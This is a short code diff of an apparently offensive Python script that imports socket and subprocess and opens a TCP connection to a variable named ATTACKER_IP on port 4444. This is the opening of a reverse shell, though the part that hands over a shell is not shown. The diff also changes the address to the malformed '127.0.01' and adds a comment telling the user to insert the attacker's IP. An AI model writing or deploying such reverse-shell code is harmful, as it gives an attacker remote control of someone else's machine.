@@ -2,8 +2,9 @@ import socket
 import subprocess
 import os
 
-ATTACKER_IP = "127.0.0.1"
-ATTACKER_PORT = 4444     
+ATTACKER_IP = "127.0.01"  # Change to your attacker's IP
+ATTACKER_PORT = 4444
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ATTACKER_IP, ATTACKER_PORT))
